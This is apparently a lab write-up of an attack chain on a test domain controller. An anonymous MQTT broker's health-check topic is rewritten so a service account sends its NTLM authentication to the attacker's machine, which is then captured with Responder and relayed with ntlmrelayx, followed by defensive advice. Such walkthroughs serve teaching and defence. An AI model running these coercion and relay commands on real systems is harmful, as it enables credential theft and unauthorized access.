- **`-sS`** is a *SYN scan* ("half-open"): nmap sends the first packet of the TCP handshake (SYN) and infers from the reply whether the port is open, without completing the connection. Fast and relatively quiet.
- **`-p-`** scans **all 65535 TCP ports**, not just the well-known top 1000. You don't want to miss anything.
- **`-T5`** is the fastest timing. In the real world `-T5` is usually **too aggressive** (you miss results and you're loud), but this is a walled-off lab and I want speed, so it's fine here.

Why not do everything at once? Because version detection and scripts (below) cost time **per port**. Running those across all 65535 ports takes forever. So: a fast scan to *find* the open ports first, and only then the heavy scans against that list:

```
$ sudo nmap -A -p53,80,88,135,139,389,445,464,593,636,1883,2179,3268,5985,9389,49664,49674,49675,49677,49678,49894,49907,49924 10.129.86.15 -T5 -oG target
```

- **`-A`** is the "everything" switch: *version detection* (`-sV`, which software and version is running), *default scripts* (`-sC`, nmap's NSE scripts that pull extra info from a service), *OS detection* and *traceroute*. This is the expensive scan, which is why I limit it with `-p` to only the ports the first scan found.
- **`-oG target`** writes *grepable output* to a file, handy for `grep` later.

And just in case, I ran a UDP scan in the background. UDP is often forgotten, but services like DNS, SNMP and sometimes a broker listen on UDP:

```
$ nmap -sU -sV -sC -n -F -T4 10.129.86.15
```

- **`-sU`** scans UDP instead of TCP. UDP scans are **slow** (no handshake to lean on), so I squeeze it with **`-F`** (*fast*: only the top-100 ports) and **`-n`** (no DNS lookups, saves time).

The targeted scan reveals the classic skeleton of a **Windows domain controller**. I only show the ports that matter for *this* story; more were open (`<SNIP>`):

```
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: Ghost Protocol Zero
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: ghostlink.htb)
445/tcp   open  microsoft-ds
<SNIP>
1883/tcp  open  mqtt                          <-- not standard here
<SNIP>
5985/tcp  open  http          Microsoft HTTPAPI 2.0 (WinRM)

Host script results:
| smb2-security-mode:
|_  Message signing enabled and required      <-- remember this line
```

DNS (53), Kerberos (88), LDAP (389), SMB (445), WinRM (5985): standard AD. Two things I flag already, they come back later:

1. **Port 1883 (MQTT)** doesn't belong in that standard set. An anomaly like this is often *the* way in on a pentest: someone put it there on purpose.
2. **`smb2-security-mode: Message signing enabled and required`.** That line tells us SMB enforces *message signing*. Why that matters comes up at the relay.

The web server on port 80 is a dull landing page with no hidden directories. So we dive into MQTT.

## 01 · The odd one out: the messaging service (MQTT)

### What is MQTT?

**MQTT** (Message Queuing Telemetry Transport) is a lightweight messaging protocol, originally for IoT: sensors, smart bulbs, trackers. Instead of devices talking to each other directly, everything goes through one central middleman. The model is called **publish/subscribe**:

<figure style="margin:26px 0">
<svg viewBox="0 0 720 250" role="img" aria-labelledby="mqtt-en" style="width:100%;height:auto;font-family:var(--font-mono,monospace);font-size:12px">
<title id="mqtt-en">MQTT publish/subscribe model</title>
<g style="fill:var(--surface-2);stroke:var(--border)">
<rect x="36" y="38" width="168" height="48" rx="6"/>
<rect x="36" y="150" width="168" height="48" rx="6"/>
<rect x="516" y="96" width="168" height="48" rx="6"/>
</g>
<g style="fill:var(--accent-weak);stroke:var(--accent)">
<rect x="296" y="90" width="150" height="60" rx="6"/>
</g>
<g text-anchor="middle" style="fill:currentColor">
<text x="120" y="60" font-weight="700">Publisher</text>
<text x="120" y="76">sensor / node</text>
<text x="120" y="172" font-weight="700">Publisher</text>
<text x="120" y="188">health-check process</text>
<text x="371" y="116" font-weight="700" style="fill:var(--accent)">BROKER</text>
<text x="371" y="134" style="fill:var(--accent)">port 1883</text>
<text x="600" y="118" font-weight="700">Subscriber</text>
<text x="600" y="134">us</text>
</g>
<g style="stroke:currentColor;fill:currentColor" text-anchor="middle" font-size="11">
<line x1="204" y1="66" x2="292" y2="104" marker-end="url(#ah)"/>
<line x1="204" y1="174" x2="292" y2="138" marker-end="url(#ah)"/>
<text x="235" y="150">publish</text>
<line x1="446" y1="120" x2="512" y2="120" marker-end="url(#ah)"/>
<text x="480" y="110">delivers</text>
</g>
<text x="371" y="196" text-anchor="middle" font-size="11" style="fill:var(--muted)">keeps the last "retained" message per topic</text>
</svg>
</figure>

_Publishers and subscribers don't know each other; they only talk to the broker. Messages are grouped into **topics** (a `/`-separated path, like `systems/node/secureshare/healthcheck`). A subscriber picks which topics to listen on; with the wildcard **`#`** you ask for all topics at once._

One detail is crucial: a publisher can mark a message as **retained**. The broker then keeps the last message per topic and sends it immediately to every new subscriber. Static info (status, configuration, sometimes credentials) lingers this way.

Two properties make MQTT interesting here. First, the broker is often left **anonymous** (no login), because IoT gear is meant to stay simple. Second, MQTT is **two-way**: you can not only read (subscribe), you can also **write** (publish). That second point is the core of the whole attack.

I grab an MQTT client (`mqttui`) and subscribe to everything (`#`):

```
$ ./mqttui -b mqtt://ghostlink.htb
```

The broker turns out to be a status dashboard for "nodes". Among the messages are two internal hostnames I didn't know yet:

```
gpz-op26-secure.ghostlink.htb    -> a locked-down file-sharing app (requires login)
gpz-op26-toolkits.ghostlink.htb  -> a Gogs code host (git)
```

## 02 · A health check to a site I can't get into

Browsing to the first host, `gpz-op26-secure`, immediately hits a hard login prompt:

![The locked-down web app denies access without valid credentials](/media/writeups/nr-secure-login.png)

_Without credentials you don't get in: "Access is denied due to invalid credentials". This is exactly the kind of wall you hit as an attacker, and the whole story revolves around it._

What kind of lock is on that door? I just ask the app itself, with a `curl -I` (fetches only the HTTP headers, not the body):

```
$ curl -I http://gpz-op26-secure.ghostlink.htb/
HTTP/1.1 401 Unauthorized
Server: Microsoft-IIS/10.0
WWW-Authenticate: NTLM
```

The `WWW-Authenticate: NTLM` header is the answer: the app expects **NTLM authentication**. That's immediately interesting, because NTLM is exactly the kind of authentication you can *elicit* and *relay*. But this only tells me the *server* offers NTLM. The question that remains: who actually holds valid NTLM credentials for this app? Back to MQTT.

Among the MQTT topics there's now one that gives everything away. I read it:

```
$ ./mqttui -b mqtt://ghostlink.htb r "GhostProtocolZero/systems/node/secureshare/healthcheck"

{"timestamp":"2026-27-04-15:45:45","node":"node-6","telemetry":{
  "healthy":true,
  "url":"gpz-op26-secure.ghostlink.htb/healthcheck",
  "lastCheckSecAgo":30,
  "responseCode":"200",
  "ip":"172.16.20.10"}}
```

Read this message carefully. It contains a **`url`**, with `responseCode: 200` and "checked 30 seconds ago". So: somewhere on the network a process **periodically fetches this URL itself** to check the locked-down app is still alive, and writes the result (200 = OK) back to MQTT.

See the tension? *I* get a hard `401` on that app. But this health-check process just gets a **200**. And we just learned from `curl` that the app wants NTLM. So this process holds valid **NTLM credentials** that I don't have. That's where the login lives. Two questions arise:

1. Can I make that health-check process send its NTLM authentication to **me** instead of to the app?
2. And if so, what can I do with that authentication?

And here the MQTT property from before returns: this message is **writable**. I can change the `url` to an address pointing at *my* machine. Then the health-check process will fetch *my* server next time, with the authentication it normally sends to the app. That redirects the authentication from the app to me, and lets me see what it looks like.

## 03 · Flipping the source: Responder + hijacking the topic

To see who comes by and with what authentication, I set up a "net" on my own machine: **Responder**.

### What does Responder actually do?

Most explanations stop at "Responder captures hashes", but that hides what the tool really does. Responder has **two jobs**:

<figure style="margin:26px 0">
<svg viewBox="0 0 720 270" role="img" aria-labelledby="resp-en" style="width:100%;height:auto;font-family:var(--font-mono,monospace);font-size:12px">
<title id="resp-en">How Responder works: poison and capture</title>
<g style="fill:var(--surface-2);stroke:var(--border)">
<rect x="40" y="14" width="170" height="44" rx="6"/>
<rect x="510" y="14" width="170" height="44" rx="6"/>
</g>
<g text-anchor="middle" style="fill:currentColor">
<text x="125" y="34" font-weight="700">Victim</text>
<text x="125" y="49">Windows host</text>
<text x="595" y="34" font-weight="700" style="fill:var(--accent)">Responder</text>
<text x="595" y="49">my machine</text>
</g>
<g style="stroke:currentColor" stroke-dasharray="3 4" opacity="0.35">
<line x1="125" y1="58" x2="125" y2="235"/>
<line x1="595" y1="58" x2="595" y2="235"/>
</g>
<g style="stroke:currentColor;fill:currentColor" text-anchor="middle" font-size="11">
<line x1="125" y1="92" x2="591" y2="92" marker-end="url(#ah)"/>
<text x="360" y="85">1 · broadcast: "who is FILESRV?" (LLMNR / NBT-NS / mDNS)</text>
<line x1="595" y1="132" x2="129" y2="132" marker-end="url(#ah)"/>
<text x="360" y="125">2 · "that's me → 10.10.14.2" (poisoning)</text>
<line x1="125" y1="172" x2="591" y2="172" marker-end="url(#ah)"/>
<text x="360" y="165">3 · connects &amp; authenticates (SMB / HTTP / ...)</text>
</g>
<g style="fill:var(--accent-weak);stroke:var(--accent)">
<rect x="470" y="192" width="210" height="40" rx="6"/>
</g>
<text x="575" y="216" text-anchor="middle" font-size="11" style="fill:currentColor" font-weight="700">4 · NTLMv2 hash logged</text>
</svg>
</figure>

1. **Poisoning.** When a Windows machine can't find a name via DNS, it falls back on old broadcast protocols (**LLMNR**, **NBT-NS**, **mDNS**) and shouts to the whole subnet: "who knows FILESRV?" Responder answers *every* such question with "that's me!" and sends its own IP. The victim therefore connects to the attacker instead of the real server.
2. **Challenging and capturing.** Responder simultaneously runs a row of **rogue servers** (SMB, HTTP, HTTPS, FTP, LDAP, SQL...). And they don't capture *passively*, they **actively challenge**: as soon as a request comes in, the rogue HTTP server replies with a `401 Unauthorized` + the header `WWW-Authenticate: NTLM`, i.e. "you can't come in, authenticate with NTLM first". A client set up for Windows integrated authentication automatically complies and sends its **NTLMv2 response**, and *that* is what Responder logs.

So no, Responder isn't purely about NTLM, it's just as much about *poisoning name resolution* to lure victims toward you. In **our** case we don't need that poisoning: the MQTT health check does the luring for us (steps 1-2). We only use Responder's rogue **HTTP server** to challenge the incoming health check for NTLM and capture the response (steps 3-4).

I start Responder on my VPN interface:

```
$ sudo responder -I tun0 -v
[+] Servers:
    HTTP server    [ON]
    HTTPS server   [ON]
```

Now I flip the health-check URL. I craft a new JSON message in which the `url` points at my own IP (`10.10.14.2`), and **publish** it back to the same topic. The **`-r`** (retain) makes the broker keep it as the new "last known" message, so the health-check process is sure to pick it up:

```
$ j='{"timestamp":"2026-03-03-09:26:21","node":"node-6","telemetry":{
      "healthy":true,"url":"http://10.10.14.2",
      "lastCheckSecAgo":45,"responseCode":"200","ip":"172.16.20.10"}}'

$ ./mqttui -b mqtt://ghostlink.htb publish -r \
    "GhostProtocolZero/systems/node/secureshare/healthcheck" "$j"
```

A few seconds later an authentication shows up in Responder, and it's not an ordinary user but a **service account**:

![Responder captures NTLMv2 authentication from svc_canary](/media/writeups/nr-responder-capture.png)

Hit. Responder's rogue server challenged the incoming health check with an NTLM `401`, and the process took the bait: it authenticated automatically, under the account `svc_canary`. That not only confirms what `curl -I` already suggested (the app *wants* NTLM), it also answers my first question: the health-check process blindly sends its NTLM authentication to any URL I supply, with real domain credentials. Now I hold that authentication.

## 04 · Crack it? The right first move, which failed here

What Responder caught is an **NTLMv2 response** (also called "Net-NTLMv2"). It is *not* the password, and not the account's fixed NT hash either. It's the **answer to one specific challenge**: the account encrypted a random number from the server with a derivative of its password.

So the standard first move is: **try to crack it**. And that's a sensible move, not a dumb one. `hashcat` (mode 5600) guesses candidate passwords, computes for each what the NTLMv2 response *would* be, and compares. Match? Then you've recovered the **plaintext password**. For a weak password this is done in seconds.

```
$ hashcat -m 5600 svc_canary.hash rockyou.txt
```

But nothing happens here. That's logical: `svc_canary` is a **service account**, and those usually have a long, random password that's in no wordlist. Cracking was the right reflex; it just ran into a password that's too strong.

And this is exactly where the mistake beginners (me included) sometimes make creeps in: cracking *harder*. The way out is to **not crack**. Because I don't need that password at all. I already hold something far more valuable: a **live authentication** that comes in whenever I want. That I can forward. Time for the relay.

## 05 · How NTLM works, and why you can relay it

### NTLM in the normal case

**NTLM** is an old Microsoft authentication protocol. It works with a **challenge-response** handshake in three steps, and the password never travels the wire:

<figure style="margin:26px 0">
<svg viewBox="0 0 720 180" role="img" aria-labelledby="ntlm-en" style="width:100%;height:auto;font-family:var(--font-mono,monospace);font-size:12px">
<title id="ntlm-en">Normal NTLM handshake</title>
<g style="fill:var(--surface-2);stroke:var(--border)">
<rect x="60" y="14" width="150" height="40" rx="6"/>
<rect x="510" y="14" width="150" height="40" rx="6"/>
</g>
<g text-anchor="middle" style="fill:currentColor">
<text x="135" y="39" font-weight="700">Client</text>
<text x="585" y="39" font-weight="700">Server</text>
</g>
<g style="stroke:currentColor" stroke-dasharray="3 4" opacity="0.35">
<line x1="135" y1="54" x2="135" y2="160"/>
<line x1="585" y1="54" x2="585" y2="160"/>
</g>
<g style="stroke:currentColor;fill:currentColor" text-anchor="middle" font-size="11">
<line x1="135" y1="82" x2="581" y2="82" marker-end="url(#ah)"/>
<text x="360" y="75">1 · Negotiate — "I want to log in"</text>
<line x1="585" y1="116" x2="139" y2="116" marker-end="url(#ah)"/>
<text x="360" y="109">2 · Challenge — random number (the puzzle)</text>
<line x1="135" y1="150" x2="581" y2="150" marker-end="url(#ah)"/>
<text x="360" y="143">3 · Response — puzzle encrypted with password hash</text>
</g>
</svg>
</figure>

The server (or the domain controller behind it) checks whether the response matches the challenge. Clever: you prove you know the password *without* sending it.

But it carries a fatal assumption. **The server only checks whether the answer matches the challenge, not *who* delivers the answer.** The protocol doesn't bind the authentication to the channel it arrives over. And that's the whole flaw.

### The relay: man-in-the-middle on the handshake

In an **NTLM relay** I crack nothing. I sit right between victim and target server and pass the puzzle pieces along. I don't need to be *able* to solve the puzzle, because the victim solves it for me:

<figure style="margin:26px 0">
<svg viewBox="0 0 720 390" role="img" aria-labelledby="relay-en" style="width:100%;height:auto;font-family:var(--font-mono,monospace);font-size:12px">
<title id="relay-en">NTLM relay sequence</title>
<g style="fill:var(--surface-2);stroke:var(--border)">
<rect x="40" y="12" width="160" height="40" rx="6"/>
<rect x="280" y="12" width="160" height="40" rx="6"/>
<rect x="520" y="12" width="160" height="40" rx="6"/>
</g>
<g text-anchor="middle" style="fill:currentColor">
<text x="120" y="30" font-weight="700">Victim</text>
<text x="120" y="45">svc_canary</text>
<text x="360" y="30" font-weight="700" style="fill:var(--accent)">Attacker</text>
<text x="360" y="45">my machine</text>
<text x="600" y="30" font-weight="700">Target server</text>
<text x="600" y="45">the web app</text>
</g>
<g style="stroke:currentColor" stroke-dasharray="3 4" opacity="0.35">
<line x1="120" y1="52" x2="120" y2="360"/>
<line x1="360" y1="52" x2="360" y2="360"/>
<line x1="600" y1="52" x2="600" y2="360"/>
</g>
<g style="stroke:currentColor;fill:currentColor" font-size="11" text-anchor="middle">
<line x1="120" y1="90" x2="356" y2="90" marker-end="url(#ah)"/>
<text x="238" y="83">1 · Negotiate</text>
<line x1="360" y1="130" x2="596" y2="130" marker-end="url(#ah)"/>
<text x="480" y="123">2 · forwarded</text>
<line x1="600" y1="170" x2="364" y2="170" marker-end="url(#ah)"/>
<text x="480" y="163">3 · Challenge</text>
<line x1="360" y1="210" x2="124" y2="210" marker-end="url(#ah)"/>
<text x="238" y="203">4 · forwarded</text>
<line x1="120" y1="250" x2="356" y2="250" marker-end="url(#ah)"/>
<text x="238" y="243">5 · Response</text>
</g>
<g style="stroke:var(--accent)" font-size="11" text-anchor="middle">
<line x1="360" y1="290" x2="596" y2="290" marker-end="url(#aha)"/>
</g>
<text x="480" y="283" text-anchor="middle" font-size="11" style="fill:var(--accent)">6 · forwarded</text>
<g style="fill:var(--accent-weak);stroke:var(--accent)">
<rect x="470" y="314" width="210" height="44" rx="6"/>
</g>
<text x="575" y="333" text-anchor="middle" font-size="11" style="fill:currentColor" font-weight="700">logged in as</text>
<text x="575" y="349" text-anchor="middle" font-size="11" style="fill:currentColor">svc_canary</text>
</svg>
</figure>

_Steps 3→4 and 5→6 are pure pass-throughs: the target server's challenge goes to the victim, and the victim's answer goes back to the target server. It accepts it and believes the attacker is svc_canary._

### Why HTTP and not SMB? (the signing rule)

Two conditions make a relay possible, and they're also the defence:

1. **You must make the victim authenticate to *you*.** We already did that via the MQTT health check.
2. **The target protocol must not enforce signing or channel binding.** Signing mathematically binds the authentication to that exact channel; a forwarded authentication then no longer matches and is rejected.

How do you know in advance where you can and can't relay? You read part of it straight off your nmap scan. Remember the line I told you to memorise?

```
| smb2-security-mode:
|_  Message signing enabled and required
```

SMB enforces signing here. Relaying to SMB is therefore hopeless, which is the default on a domain controller anyway. But I don't *want* SMB: my prize is the **HTTP web app**, and the coerced authentication comes in over HTTP too. HTTP does not enforce channel binding (the counterpart of signing, **EPA**, *Extended Protection for Authentication*) by default, unless an admin explicitly turns it on. So HTTP → HTTP is the natural target. If the web app *had* enforced EPA, this whole attack would dead-end here.

## 06 · Running the relay with ntlmrelayx

Responder *captures* authentications. For *forwarding* I use **`ntlmrelayx`** from the **Impacket** suite (a collection of Python tools for Windows network protocols).

### What does ntlmrelayx actually do?

`ntlmrelayx` takes an incoming authentication and plays it through live to a target *you* choose, over a protocol *you* choose. What it does with that authenticated session afterward is where the power sits:

<figure style="margin:26px 0">
<svg viewBox="0 0 720 280" role="img" aria-labelledby="relayx-en" style="width:100%;height:auto;font-family:var(--font-mono,monospace);font-size:12px">
<title id="relayx-en">ntlmrelayx: from authentication to action</title>
<g style="fill:var(--surface-2);stroke:var(--border)">
<rect x="24" y="110" width="160" height="60" rx="6"/>
<rect x="450" y="30" width="260" height="56" rx="6"/>
<rect x="450" y="110" width="260" height="42" rx="6"/>
<rect x="450" y="196" width="260" height="56" rx="6"/>
</g>
<g style="fill:var(--accent-weak);stroke:var(--accent)">
<rect x="230" y="108" width="190" height="64" rx="6"/>
</g>
<g text-anchor="middle" style="fill:currentColor">
<text x="104" y="136" font-weight="700">Coerced</text>
<text x="104" y="152">NTLM authentication</text>
<text x="325" y="136" font-weight="700" style="fill:var(--accent)">ntlmrelayx</text>
<text x="325" y="152" style="fill:var(--accent)">picks target + protocol</text>
<text x="580" y="52" font-weight="700">One-shot action</text>
<text x="580" y="70">dump SAM / LDAP / ADCS</text>
<text x="580" y="135" font-weight="700">-socks → SOCKS proxy</text>
<text x="580" y="222" font-weight="700">Browser / Burp</text>
<text x="580" y="240">interactive, as the victim</text>
</g>
<g style="stroke:currentColor;fill:currentColor" text-anchor="middle" font-size="11">
<line x1="184" y1="140" x2="226" y2="140" marker-end="url(#ah)"/>
<line x1="420" y1="134" x2="446" y2="70" marker-end="url(#ah)"/>
<line x1="420" y1="150" x2="446" y2="130" marker-end="url(#ah)"/>
<line x1="580" y1="152" x2="580" y2="192" marker-end="url(#ah)"/>
</g>
</svg>
</figure>

_You can relay to SMB, LDAP, HTTP, MSSQL and more, and immediately run an action on it (dump hashes, create a computer account, request an ADCS certificate). Or, and that's what we do here: you keep the session open behind a **SOCKS proxy**, so you can drive it interactively with an ordinary browser._

I aim the relay at the web app over HTTP, and set the inbound HTTP port to `8888` so I don't need root for low ports:

```
$ ntlmrelayx.py -t http://gpz-op26-secure.ghostlink.htb \
    --http-port 8888 --no-smb-server --keep-relaying
```

Then I publish the flipped health check to MQTT once more (now pointing at my relay instead of at Responder). As soon as the health-check process comes by again:

<img src="/media/writeups/nr-relay-succeed.png" alt="ntlmrelayx succeeds: SUCCEED" style="width:100%" />

**SUCCEED.** The web app accepted svc_canary, through me. I now have an authenticated session to an app whose password I never knew.

### One relay isn't enough: the SOCKS proxy

By default `ntlmrelayx` only fetches the front page and is then done. I don't want one page, I want to **click around**: try downloads, make API calls. For that I add **`-socks`**:

```
$ ntlmrelayx.py -t http://gpz-op26-secure.ghostlink.htb \
    --http-port 8888 --no-smb-server --keep-relaying -socks
...
[*] SOCKS: Adding HTTP://GHOSTLINK/SVC_CANARY@gpz-op26-secure.ghostlink.htb(80) to active SOCKS connection. Enjoy
```

`ntlmrelayx` now keeps the authenticated session **open** and exposes a **SOCKS proxy** for it on my machine. A SOCKS proxy is a pass-through hatch: everything I send through it comes out as the authenticated svc_canary session. So I don't have to re-trigger the authentication each time, I reuse that one successful relay as often as I like. I point my browser (or Burp/Caido) at the proxy:

```
[proxychains] via SOCKS 127.0.0.1:1080  ->  gpz-op26-secure.ghostlink.htb
```

And I'm standing right inside the "secure file sharing" app, logged in, without ever having guessed or cracked a password.

![The secure file sharing app, logged in as svc_canary via the relay](/media/writeups/nr-secure-filesharing.png)

## 07 · Blue team: where does this attack break?

Understanding an attack means knowing where you stop it. This chain could have been broken in four places:

- **No anonymous messaging broker.** Everything starts with a broker that allows reading *and* writing without authentication. Turn on login, use TLS (port 8883) so messages don't travel in plaintext, and don't expose it externally.
- **Don't trust a URL from a message you didn't set yourself.** The health-check process blindly fetched an attacker-modifiable URL. An allowlist of permitted health-check destinations makes the coercion impossible.
- **Enforce signing / channel binding.** NTLM relay only works because the authentication isn't bound to the channel. SMB signing was already required here; **EPA** on the HTTP web app would have done the same for HTTP.
- **Disable NTLM where you can and monitor the rest.** Microsoft treats NTLM as legacy; Kerberos can't be relayed this way. And an NTLM authentication from a service account from an unexpected source is exactly the signal that should have fired here.

## 08 · The lesson

The core I carry to every next machine:

1. **Enumerate in layers.** Find all ports fast first, then run the heavy scans in a targeted way. An anomalous port (here MQTT on 1883) is often the way in.
2. **Cracking a captured NTLMv2 response is the right first move**, not a dumb one, because a weak password gives you the plaintext back. If it fails (typical for a strong service-account password), that's not a dead end but a **signal**: stop cracking and think about relaying.
3. **Relaying is about two things:** a way to make an account authenticate to you (here a writable health check; elsewhere often a printer bug, a share link or a scheduled check), and a target that **doesn't enforce signing / EPA**. Your nmap scan already tells you part of where that's possible. The password then stops mattering.

</div>
